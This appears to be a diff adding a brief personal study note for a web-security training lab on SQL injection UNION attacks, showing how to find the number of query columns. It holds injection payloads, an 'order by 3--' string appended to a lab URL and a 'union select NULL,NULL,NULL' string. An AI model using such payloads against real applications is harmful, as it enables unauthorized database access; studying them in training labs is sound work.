@@ -1,0 +1,8 @@
+Lab #03
+SQL injection UNION attack, determining the number of columns returned by the query
+Finding Number of column
+
+https://0a0f0059049847db8140252c009400e7.web-security-academy.net/filter?category=Gifts' order by 3--
+Injection: ' order by 3--
+or
+' union select NULL,NULL,Null --
